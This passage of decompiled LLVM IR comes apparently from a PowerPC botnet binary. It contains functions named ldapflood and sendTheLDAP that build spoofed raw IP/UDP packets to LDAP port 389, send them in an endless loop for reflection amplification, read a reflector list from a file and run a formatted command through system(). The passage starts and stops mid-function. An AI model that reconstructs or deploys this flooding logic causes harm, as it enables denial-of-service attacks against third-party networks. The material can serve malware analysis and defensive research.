  br i1 %tmp42, label %dec_label_pc_1000727c, label %dec_label_pc_10007248

dec_label_pc_10007248:                            ; preds = %dec_label_pc_1000723c
  store i32 268464720, i32* @lr, align 4
  %v1_1000724c = call i32 @__GI_time(i32 0)
  store i32 %v1_1000724c, i32* %r11.global-to-local, align 4
  store i32 %v1_10006c48, i32* %r9.global-to-local, align 4
  %v2_10007264 = icmp ult i32 %v1_1000724c, %v2_10007260
  br i1 %v2_10007264, label %dec_label_pc_10007274, label %dec_label_pc_1000726c

dec_label_pc_1000726c:                            ; preds = %dec_label_pc_10007248
  %v0_10007270 = call i32 @__GI_exit()
  br label %dec_label_pc_10007274

dec_label_pc_10007274:                            ; preds = %dec_label_pc_10007248, %dec_label_pc_1000726c
  br label %dec_label_pc_1000727c

dec_label_pc_1000727c:                            ; preds = %dec_label_pc_1000723c, %dec_label_pc_10007274
  %stack_var_-1120.1 = phi i32 [ %stack_var_-1120.0, %dec_label_pc_1000723c ], [ 0, %dec_label_pc_10007274 ]
  store i32 %stack_var_-1120.1, i32* %r9.global-to-local, align 4
  %v1_10007280 = add i32 %stack_var_-1120.1, 1
  br label %dec_label_pc_1000723c

dec_label_pc_1000728c:                            ; preds = %dec_label_pc_10007118
  %v0_10007290 = call i32 @__GI_exit()
  br label %dec_label_pc_10007294

dec_label_pc_10007294:                            ; preds = %entry, %dec_label_pc_10006c44, %dec_label_pc_1000728c
  %v0_100072c0 = phi i32 [ %v1_10006bdc, %entry ], [ %v0_10006c74, %dec_label_pc_10006c44 ], [ %v0_10007290, %dec_label_pc_1000728c ]
  %v2_10007294 = load i32, i32* %stack_var_-1168, align 4
  store i32 %v5_10006ba4, i32* %r9.global-to-local, align 4
  store i32 %v2_10007294, i32* %r11.global-to-local, align 4
  ret i32 %v0_100072c0

; uselistorder directives
  uselistorder i32 %stack_var_-1120.1, { 1, 0 }
  uselistorder i32 %v3_100071ac, { 1, 0, 2 }
  uselistorder i32 %v1_10007100, { 1, 0 }
  uselistorder i32 %v2_1000706c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge15, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-1128.0.ph, { 1, 0 }
  uselistorder i32 %v3_10006ee4, { 1, 0, 2 }
  uselistorder i32 %v3_10006ed0, { 1, 0 }
  uselistorder i32 %v1_10006d80, { 4, 3, 1, 2, 5, 0 }
  uselistorder i32 %v0_10006d64, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10006cd4, { 1, 0, 2 }
  uselistorder i32 %v2_10006cc4, { 1, 0 }
  uselistorder i32 %v1_10006c80, { 2, 1, 0, 3 }
  uselistorder i32* %v1_10006c6c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_10006c68, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32 %v1_10006c48, { 1, 0 }
  uselistorder i32* %stack_var_-1168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 19, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007294, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000727c, { 1, 0 }
  uselistorder label %dec_label_pc_10007274, { 1, 0 }
  uselistorder label %dec_label_pc_10007230, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007060, { 1, 0 }
  uselistorder label %dec_label_pc_10006f68, { 1, 0 }
  uselistorder label %dec_label_pc_10006c44, { 1, 0 }
  uselistorder label %dec_label_pc_10006c18, { 1, 0 }
}

define i32 @setup_ldap_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100072e8 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100072e8, i32* %arg1, align 4
  %v1_100072fc = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100072fc, i32* %arg1, align 4
  %v3_1000730c = add i32 %tmp, 1
  %v4_1000730c = inttoptr i32 %v3_1000730c to i8*
  store i8 0, i8* %v4_1000730c, align 1
  %v3_10007318 = add i32 %tmp, 2
  %v4_10007318 = inttoptr i32 %v3_10007318 to i16*
  store i16 79, i16* %v4_10007318, align 2
  store i32 54321, i32* @r3, align 4
  %v1_10007324 = call i32 @htonl(i32 54321)
  %v1_10007334 = trunc i32 %v1_10007324 to i16
  %v3_10007334 = add i32 %tmp, 4
  %v4_10007334 = inttoptr i32 %v3_10007334 to i16*
  store i16 %v1_10007334, i16* %v4_10007334, align 2
  %v3_10007340 = add i32 %tmp, 6
  %v4_10007340 = inttoptr i32 %v3_10007340 to i16*
  store i16 0, i16* %v4_10007340, align 2
  %v3_1000734c = add i32 %tmp, 8
  %v4_1000734c = inttoptr i32 %v3_1000734c to i8*
  store i8 -1, i8* %v4_1000734c, align 1
  %v3_10007358 = add i32 %tmp, 9
  %v4_10007358 = inttoptr i32 %v3_10007358 to i8*
  store i8 17, i8* %v4_10007358, align 1
  %v3_10007364 = add i32 %tmp, 10
  %v4_10007364 = inttoptr i32 %v3_10007364 to i16*
  store i16 0, i16* %v4_10007364, align 2
  store i32 268465012, i32* @lr, align 4
  %v2_10007370 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_1002a5c8.101 to i32))
  %v2_1000737c = add i32 %tmp, 12
  %v3_1000737c = inttoptr i32 %v2_1000737c to i32*
  store i32 %v2_10007370, i32* %v3_1000737c, align 4
  ret i32 %v2_10007370
}

define i32 @setup_ldap_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 5678, i32* @r3, align 4
  %v1_100073b4 = call i32 @htons(i32 5678)
  %sext = mul i32 %v1_100073b4, 65536
  %v1_100073b8 = sdiv i32 %sext, 65536
  %v1_100073c0 = trunc i32 %v1_100073b8 to i16
  store i16 %v1_100073c0, i16* %arg1, align 2
  store i32 389, i32* @r3, align 4
  %v1_100073c8 = call i32 @htons(i32 389)
  %v1_100073d4 = trunc i32 %v1_100073c8 to i16
  %v3_100073d4 = add i32 %tmp, 2
  %v4_100073d4 = inttoptr i32 %v3_100073d4 to i16*
  store i16 %v1_100073d4, i16* %v4_100073d4, align 2
  %v3_100073e0 = add i32 %tmp, 6
  %v4_100073e0 = inttoptr i32 %v3_100073e0 to i16*
  store i16 0, i16* %v4_100073e0, align 2
  %v1_100073e8 = add i32 %tmp, 8
  store i32 %v1_100073e8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002ae70.318 to i32), i32* @r4, align 4
  store i32 51, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000740c.319 to i32), i32* @lr, align 4
  %v0_10007408 = call i32 @memcpy()
  store i32 59, i32* @r3, align 4
  %v1_10007410 = call i32 @htons(i32 59)
  %v2_10007410 = trunc i32 %v1_10007410 to i16
  %v3_1000741c = add i32 %tmp, 4
  %v4_1000741c = inttoptr i32 %v3_1000741c to i16*
  store i16 %v2_10007410, i16* %v4_1000741c, align 2
  ret i32 %v1_10007410

; uselistorder directives
  uselistorder i32 5678, { 0, 3, 1, 4, 2, 5 }
}

define i32 @ldapflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_10007458 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_10007464 = add i32 %v2_10007458, 20
  %v5_10007468 = inttoptr i32 %v1_10007464 to i16*
  %v1_10007474 = add i32 %arg1, 12
  %v2_10007474 = inttoptr i32 %v1_10007474 to i32*
  %v3_10007474 = load i32, i32* %v2_10007474, align 4
  %v1_10007494 = add i32 %arg1, 4
  %v2_10007494 = inttoptr i32 %v1_10007494 to i32*
  %v3_10007494 = load i32, i32* %v2_10007494, align 4
  store i32 268465324, i32* @lr, align 4
  %v3_100074a8 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_100074a8, -1
  br i1 %tmp26, label %dec_label_pc_100074c8, label %dec_label_pc_100074c0

dec_label_pc_100074c0:                            ; preds = %entry
  %v0_100074c4 = call i32 @__GI_exit()
  br label %dec_label_pc_100074c8

dec_label_pc_100074c8:                            ; preds = %entry, %dec_label_pc_100074c0
  store i32 268465360, i32* @lr, align 4
  %v1_100074cc = call i32 @__GI_time(i32 0)
  %v1_100074d8 = call i32 @init_rand(i32 %v1_100074cc)
  store i32 %v2_10007458, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268465396, i32* @lr, align 4
  %v0_100074f0 = call i32 @__GI_memset()
  store i32 268465404, i32* @lr, align 4
  %v2_100074f8 = call i32 @setup_ldap_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268465412, i32* @lr, align 4
  %v2_10007500 = call i32 @setup_ldap_udp_header(i16* %v5_10007468)
  store i32 268465416, i32* @lr, align 4
  %v0_10007504 = call i32 @random()
  %v2_10007524 = srem i32 %v0_10007504, 65535
  %fold = add nsw i32 %v2_10007524, 64510
  %v1_10007550 = urem i32 %fold, 65536
  store i32 %v1_10007550, i32* @r3, align 4
  %v1_10007558 = call i32 @htons(i32 %v1_10007550)
  %v1_10007564 = trunc i32 %v1_10007558 to i16
  store i16 %v1_10007564, i16* %v5_10007468, align 4
  %v2_10007570 = add i32 %v2_10007458, 12
  %v3_10007570 = inttoptr i32 %v2_10007570 to i32*
  store i32 %v3_10007474, i32* %v3_10007570, align 4
  %v1_10007578 = add i32 %v3_10007494, 4
  %v2_10007578 = inttoptr i32 %v1_10007578 to i32*
  %v3_10007578 = load i32, i32* %v2_10007578, align 4
  %v2_10007580 = add i32 %v2_10007458, 16
  %v3_10007580 = inttoptr i32 %v2_10007580 to i32*
  store i32 %v3_10007578, i32* %v3_10007580, align 4
  %v1_1000758c = or i32 %v2_10007458, 2
  %v2_1000758c = inttoptr i32 %v1_1000758c to i16*
  %v3_1000758c = load i16, i16* %v2_1000758c, align 2
  %div = udiv i16 %v3_1000758c, 2
  %v1_10007594 = zext i16 %div to i32
  %v2_100075a4 = bitcast i32* %stack_var_-4144 to i16*
  %v3_100075a4 = call i32 @csum(i16* %v2_100075a4, i32 %v1_10007594)
  %v1_100075b0 = trunc i32 %v3_100075a4 to i16
  %v3_100075b0 = add i32 %v2_10007458, 10
  %v4_100075b0 = inttoptr i32 %v3_100075b0 to i16*
  store i16 %v1_100075b0, i16* %v4_100075b0, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_100075bc = ptrtoint i32* %stack_var_-32 to i32
  store i32 268465628, i32* @lr, align 4
  %v5_100075d8 = call i32 @__GI_setsockopt(i32 %v3_100074a8, i32 0, i32 3, i32 %v2_100075bc, i32 4)
  %tmp28 = icmp sgt i32 %v5_100075d8, -1
  br i1 %tmp28, label %dec_label_pc_100075f0, label %dec_label_pc_100075e8

dec_label_pc_100075e8:                            ; preds = %dec_label_pc_100074c8
  %v0_100075ec = call i32 @__GI_exit()
  br label %dec_label_pc_100075f0

dec_label_pc_100075f0:                            ; preds = %dec_label_pc_100074c8, %dec_label_pc_100075e8
  store i32 268465656, i32* @lr, align 4
  %v1_100075f4 = call i32 @__GI_time(i32 0)
  %v1_10007600 = call i32 @init_rand(i32 %v1_100075f4)
  %v3_1000767c = add i32 %v2_10007458, 4
  %v4_1000767c = inttoptr i32 %v3_1000767c to i16*
  br label %dec_label_pc_1000760c

dec_label_pc_1000760c:                            ; preds = %dec_label_pc_100076f0, %dec_label_pc_100075f0
  %stack_var_-4160.0 = phi i32 [ %v3_10007494, %dec_label_pc_100075f0 ], [ %v3_10007648, %dec_label_pc_100076f0 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_100075f0 ], [ %v1_100076f4, %dec_label_pc_100076f0 ]
  %v3_10007610 = load i16, i16* %v2_1000758c, align 2
  %v4_10007610 = zext i16 %v3_10007610 to i32
  store i32 268465732, i32* @lr, align 4
  %v6_10007640 = call i32 @sendto(i32 %v3_100074a8, i32 %v2_10007458, i32 %v4_10007610, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_10007648 = add i32 %stack_var_-4160.0, 532
  %v2_10007648 = inttoptr i32 %v1_10007648 to i32*
  %v3_10007648 = load i32, i32* %v2_10007648, align 4
  %v1_10007654 = add i32 %v3_10007648, 4
  %v2_10007654 = inttoptr i32 %v1_10007654 to i32*
  %v3_10007654 = load i32, i32* %v2_10007654, align 4
  store i32 %v3_10007654, i32* %v3_10007580, align 4
  %v0_10007660 = call i32 @rand_cmwc()
  store i32 %v0_10007660, i32* @r3, align 4
  %v1_1000766c = call i32 @htonl(i32 %v0_10007660)
  %v1_1000767c = trunc i32 %v1_1000766c to i16
  store i16 %v1_1000767c, i16* %v4_1000767c, align 4
  %v3_10007688 = load i16, i16* %v2_1000758c, align 2
  %div29 = udiv i16 %v3_10007688, 2
  %v1_10007690 = zext i16 %div29 to i32
  %v3_100076a0 = call i32 @csum(i16* %v2_100075a4, i32 %v1_10007690)
  %v1_100076ac = trunc i32 %v3_100076a0 to i16
  store i16 %v1_100076ac, i16* %v4_100075b0, align 2
  %v3_100076b4 = load i32, i32* @global_var_100451ac.120, align 4
  %v1_100076b8 = add i32 %v3_100076b4, 1
  store i32 %v1_100076b8, i32* @global_var_100451ac.120, align 4
  %v3_100076c8 = load i32, i32* @global_var_10045194.121, align 4
  %v3_100076d0 = icmp ugt i32 %v3_100076c8, %storemerge4
  br i1 %v3_100076d0, label %dec_label_pc_100076f0, label %dec_label_pc_100076d8

dec_label_pc_100076d8:                            ; preds = %dec_label_pc_1000760c
  %v3_100076e4 = load i32, i32* @global_var_100450d4.122, align 4
  store i32 268465904, i32* @lr, align 4
  %v1_100076ec = call i32 @usleep(i32 %v3_100076e4)
  br label %dec_label_pc_100076f0

dec_label_pc_100076f0:                            ; preds = %dec_label_pc_1000760c, %dec_label_pc_100076d8
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_1000760c ], [ 0, %dec_label_pc_100076d8 ]
  %v1_100076f4 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_1000760c

; uselistorder directives
  uselistorder i32 %v3_10007648, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_10007550, { 1, 0 }
  uselistorder i32 %v2_10007458, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100076f0, { 1, 0 }
  uselistorder label %dec_label_pc_100075f0, { 1, 0 }
  uselistorder label %dec_label_pc_100074c8, { 1, 0 }
}

define i32 @sendTheLDAP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007700 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007700, i32* %stack_var_-1168, align 4
  %v5_10007700 = ptrtoint i32* %stack_var_-1168 to i32
  %v1_10007738 = call i32 @mfork(i32 %arg2)
  %v3_10007740 = icmp eq i32 %v1_10007738, 0
  br i1 %v3_10007740, label %dec_label_pc_10007748, label %dec_label_pc_10007df0

dec_label_pc_10007748:                            ; preds = %entry
  store i32 268466008, i32* @lr, align 4
  %v3_10007754 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp40 = icmp sgt i32 %v3_10007754, -1
  br i1 %tmp40, label %dec_label_pc_10007774, label %dec_label_pc_1000776c

dec_label_pc_1000776c:                            ; preds = %dec_label_pc_10007748
  %v0_10007770 = call i32 @__GI_exit()
  br label %dec_label_pc_10007774

dec_label_pc_10007774:                            ; preds = %dec_label_pc_10007748, %dec_label_pc_1000776c
  %v2_10007778 = icmp sgt i32 %arg3, 5
  br i1 %v2_10007778, label %dec_label_pc_100077a0, label %dec_label_pc_10007780

dec_label_pc_10007780:                            ; preds = %dec_label_pc_10007774
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10007794 = call i32 @Send(i32 %arg1, i32 ptrtoint ([113 x i8]* @global_var_1002aea4.323 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000779c = call i32 @__GI_exit()
  br label %dec_label_pc_100077a0

dec_label_pc_100077a0:                            ; preds = %dec_label_pc_10007774, %dec_label_pc_10007780
  store i32 268466088, i32* @lr, align 4
  %v1_100077a4 = call i32 @__GI_time(i32 0)
  %v1_100077b4 = add i32 %arg4, 24
  store i32 %v1_100077b4, i32* %r9.global-to-local, align 4
  %v1_100077b8 = inttoptr i32 %v1_100077b4 to i32*
  %v2_100077b8 = load i32, i32* %v1_100077b8, align 4
  %v1_100077c4 = add i32 %arg4, 12
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v1_100077c8 = inttoptr i32 %v1_100077c4 to i32*
  %v2_100077c8 = load i32, i32* %v1_100077c8, align 4
  store i32 %v2_100077c8, i32* @r3, align 4
  %v0_100077d0 = call i32 @__GI_strlen()
  %v1_100077d8 = mul i32 %v0_100077d0, 5
  store i32 %v1_100077d8, i32* %r9.global-to-local, align 4
  %v1_100077dc = add i32 %v1_100077d8, 160
  %v2_100077e8 = icmp sgt i32 %v1_100077dc, 1023
  br i1 %v2_100077e8, label %dec_label_pc_10007df0, label %dec_label_pc_100077f0

dec_label_pc_100077f0:                            ; preds = %dec_label_pc_100077a0
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v2_100077fc = load i32, i32* %v1_100077c8, align 4
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v2_10007808 = load i32, i32* %v1_100077c8, align 4
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v2_10007814 = load i32, i32* %v1_100077c8, align 4
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v2_10007820 = load i32, i32* %v1_100077c8, align 4
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v2_1000782c = load i32, i32* %v1_100077c8, align 4
  store i32 %v2_1000782c, i32* %r11.global-to-local, align 4
  %v2_10007830 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_10007830, i32* @r3, align 4
  store i32 %v1_100077dc, i32* @r4, align 4
  store i32 ptrtoint ([176 x i8]* @global_var_1002af18.326 to i32), i32* @r5, align 4
  store i32 %v2_10007820, i32* %r9.global-to-local, align 4
  store i32 268466268, i32* @lr, align 4
  %v9_10007858 = call i32 @__GI_snprintf(i32 %v2_10007830, i32 %v1_100077dc, i32 ptrtoint ([176 x i8]* @global_var_1002af18.326 to i32), i32 %v2_100077fc, i32 %v2_10007808, i32 %v2_10007814, i32 %v2_10007820, i32 %v1_100077dc)
  store i32 ptrtoint ([3 x i8]* @global_var_10007868.327 to i32), i32* @lr, align 4
  %v1_10007864 = call i32 @system(i32 %v2_10007830)
  store i32 268466288, i32* @lr, align 4
  %v1_1000786c = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_1000787c.328 to i32), i32* @lr, align 4
  %v1_10007878 = call i32 @srand(i32 %v1_1000786c)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451b4.106, align 4
  store i32 128, i32* @r3, align 4
  store i32 268466340, i32* @lr, align 4
  %v0_100078a0 = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_100078a0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268466372, i32* @lr, align 4
  %v0_100078c0 = call i32 @__GI_memset()
  %v1_100078d0 = add i32 %arg4, 16
  store i32 %v1_100078d0, i32* %r9.global-to-local, align 4
  %v1_100078d4 = inttoptr i32 %v1_100078d0 to i32*
  %v2_100078d4 = load i32, i32* %v1_100078d4, align 4
  store i32 268466400, i32* @lr, align 4
  %v1_100078dc = call i32 @atol(i32 %v2_100078d4)
  %v1_100078ec = add i32 %arg4, 20
  store i32 %v1_100078ec, i32* %r9.global-to-local, align 4
  %v1_100078f0 = inttoptr i32 %v1_100078ec to i32*
  %v2_100078f0 = load i32, i32* %v1_100078f0, align 4
  store i32 268466428, i32* @lr, align 4
  %v1_100078f8 = call i32 @atol(i32 %v2_100078f0)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268466488, i32* @lr, align 4
  %v3_10007934 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_1002afc8.329 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6f0.111 to i32))
  %v2_10007958 = add i32 %v0_100078c0, -1
  br label %dec_label_pc_10007ad0.outer

dec_label_pc_10007944:                            ; preds = %dec_label_pc_10007ad0
  store i32 %v0_100078c0, i32* @r3, align 4
  %v0_10007948 = call i32 @__GI_strlen()
  %v1_1000795c = add i32 %v0_10007948, %v2_10007958
  store i32 %v1_1000795c, i32* %r9.global-to-local, align 4
  %v1_10007960 = inttoptr i32 %v1_1000795c to i8*
  %v2_10007960 = load i8, i8* %v1_10007960, align 1
  %v3_10007968 = icmp eq i8 %v2_10007960, 10
  br i1 %v3_10007968, label %dec_label_pc_1000799c, label %dec_label_pc_10007970

dec_label_pc_10007970:                            ; preds = %dec_label_pc_10007944
  store i32 %v0_100078c0, i32* @r3, align 4
  %v0_10007974 = call i32 @__GI_strlen()
  %v1_10007988 = add i32 %v0_10007974, %v2_10007958
  store i32 %v1_10007988, i32* %r9.global-to-local, align 4
  %v1_1000798c = inttoptr i32 %v1_10007988 to i8*
  %v2_1000798c = load i8, i8* %v1_1000798c, align 1
  %v3_10007994 = icmp eq i8 %v2_1000798c, 13
  br i1 %v3_10007994, label %dec_label_pc_1000799c, label %dec_label_pc_10007ad0

dec_label_pc_1000799c:                            ; preds = %dec_label_pc_10007970, %dec_label_pc_10007944
  store i32 %v0_100078c0, i32* @r3, align 4
  %v0_100079a0 = call i32 @__GI_strlen()
  %v1_100079b4 = add i32 %v0_100079a0, %v2_10007958
  %v3_100079bc = inttoptr i32 %v1_100079b4 to i8*
  store i8 0, i8* %v3_100079bc, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100079c4 = load i32, i32* @global_var_100451b4.106, align 4
  %v3_100079c8 = icmp eq i32 %v3_100079c4, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_100079c8, label %dec_label_pc_100079d0, label %dec_label_pc_10007a54

dec_label_pc_100079d0:                            ; preds = %dec_label_pc_1000799c
  store i32 268466648, i32* @lr, align 4
  %v0_100079d4 = call i32 @malloc()
  store i32 %v0_100079d4, i32* @global_var_100451b4.106, align 4
  store i32 %v0_100079d4, i32* %r9.global-to-local, align 4
  %v2_100079f4 = inttoptr i32 %v0_100079d4 to i32*
  store i32 0, i32* %v2_100079f4, align 4
  %v1_100079fc = load i32, i32* %r9.global-to-local, align 4
  %v2_100079fc = add i32 %v1_100079fc, 4
  %v3_100079fc = inttoptr i32 %v2_100079fc to i32*
  store i32 0, i32* %v3_100079fc, align 4
  %v1_10007a04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007a04 = add i32 %v1_10007a04, 8
  %v3_10007a04 = inttoptr i32 %v2_10007a04 to i32*
  store i32 0, i32* %v3_10007a04, align 4
  %v1_10007a0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10007a0c = add i32 %v1_10007a0c, 12
  %v3_10007a0c = inttoptr i32 %v2_10007a0c to i32*
  store i32 0, i32* %v3_10007a0c, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10007a14 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 268466720, i32* @lr, align 4
  %v1_10007a1c = call i32 @inet_addr(i32 %v0_100078c0)
  %v2_10007a24 = add i32 %v3_10007a14, 4
  %v3_10007a24 = inttoptr i32 %v2_10007a24 to i32*
  store i32 %v1_10007a1c, i32* %v3_10007a24, align 4
  %v3_10007a2c = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10007a38 = add i32 %v3_10007a2c, 532
  %v3_10007a38 = inttoptr i32 %v2_10007a38 to i32*
  store i32 %v3_10007a2c, i32* %v3_10007a38, align 4
  %v3_10007a40 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10007a40, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10007a4c = add i32 %v3_10007a40, 536
  %v3_10007a4c = inttoptr i32 %v2_10007a4c to i32*
  store i32 %v3_10007a40, i32* %v3_10007a4c, align 4
  br label %dec_label_pc_10007ac4

dec_label_pc_10007a54:                            ; preds = %dec_label_pc_1000799c
  store i32 268466780, i32* @lr, align 4
  %v0_10007a58 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10007a58, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268466812, i32* @lr, align 4
  %v0_10007a78 = call i32 @__GI_memset()
  store i32 268466820, i32* @lr, align 4
  %v1_10007a80 = call i32 @inet_addr(i32 %v0_100078c0)
  %v2_10007a8c = add i32 %v0_10007a58, 4
  %v3_10007a8c = inttoptr i32 %v2_10007a8c to i32*
  store i32 %v1_10007a80, i32* %v3_10007a8c, align 4
  %v3_10007a94 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10007a9c = add i32 %v0_10007a58, 536
  %v3_10007a9c = inttoptr i32 %v2_10007a9c to i32*
  store i32 %v3_10007a94, i32* %v3_10007a9c, align 4
  %v3_10007aa4 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10007aa4, i32* %r9.global-to-local, align 4
  %v1_10007aa8 = add i32 %v3_10007aa4, 532
  %v2_10007aa8 = inttoptr i32 %v1_10007aa8 to i32*
  %v3_10007aa8 = load i32, i32* %v2_10007aa8, align 4
  %v2_10007ab0 = add i32 %v0_10007a58, 532
  %v3_10007ab0 = inttoptr i32 %v2_10007ab0 to i32*
  store i32 %v3_10007aa8, i32* %v3_10007ab0, align 4
  %v3_10007ab8 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10007ab8, i32* %r9.global-to-local, align 4
  %v2_10007ac0 = add i32 %v3_10007ab8, 532
  %v3_10007ac0 = inttoptr i32 %v2_10007ac0 to i32*
  store i32 %v0_10007a58, i32* %v3_10007ac0, align 4
  br label %dec_label_pc_10007ac4

dec_label_pc_10007ac4:                            ; preds = %dec_label_pc_100079d0, %dec_label_pc_10007a54
  store i32 %stack_var_-1128.0.ph, i32* %r9.global-to-local, align 4
  %v1_10007ac8 = add i32 %stack_var_-1128.0.ph, 1
  br label %dec_label_pc_10007ad0.outer

dec_label_pc_10007ad0.outer:                      ; preds = %dec_label_pc_10007ac4, %dec_label_pc_100077f0
  %stack_var_-1128.0.ph = phi i32 [ %v1_10007ac8, %dec_label_pc_10007ac4 ], [ 0, %dec_label_pc_100077f0 ]
  br label %dec_label_pc_10007ad0

dec_label_pc_10007ad0:                            ; preds = %dec_label_pc_10007ad0.outer, %dec_label_pc_10007970
  store i32 268466912, i32* @lr, align 4
  %v3_10007adc = call i32 @fgets(i32 %v0_100078c0, i32 128, i32 %v3_10007934)
  %v3_10007ae4 = icmp eq i32 %v3_10007adc, 0
  br i1 %v3_10007ae4, label %dec_label_pc_10007aec, label %dec_label_pc_10007944

dec_label_pc_10007aec:                            ; preds = %dec_label_pc_10007ad0
  %v3_10007af0 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10007af0, i32* %r9.global-to-local, align 4
  %v1_10007af4 = add i32 %v3_10007af0, 532
  %v2_10007af4 = inttoptr i32 %v1_10007af4 to i32*
  %v3_10007af4 = load i32, i32* %v2_10007af4, align 4
  %v1_10007b00 = mul i32 %v1_100078dc, 4
  %v1_10007b08 = add i32 %v1_10007b00, 30
  %v1_10007b0c = and i32 %v1_10007b08, -16
  %v2_10007b14 = load i32, i32* %stack_var_-1168, align 4
  %v1_10007b1c = load i32, i32* @r1, align 4
  %v3_10007b1c = sub i32 %v1_10007b1c, %v1_10007b0c
  %v4_10007b1c = inttoptr i32 %v3_10007b1c to i32*
  store i32 %v2_10007b14, i32* %v4_10007b1c, align 4
  %v1_10007b2c = add i32 %v3_10007b1c, 23
  %v1_10007b30 = and i32 %v1_10007b2c, -16
  %v1_10007b50 = add i32 %arg4, 4
  store i32 %v1_10007b50, i32* %r9.global-to-local, align 4
  %v1_10007b54 = inttoptr i32 %v1_10007b50 to i32*
  %v2_10007b54 = load i32, i32* %v1_10007b54, align 4
  store i32 268467040, i32* @lr, align 4
  %v1_10007b5c = call i32 @inet_addr(i32 %v2_10007b54)
  %v1_10007b6c = mul i32 %v1_100078dc, 24
  %v1_10007b70 = add i32 %v1_10007b6c, 15
  store i32 %v1_10007b70, i32* %r9.global-to-local, align 4
  %v1_10007b74 = add i32 %v1_10007b6c, 30
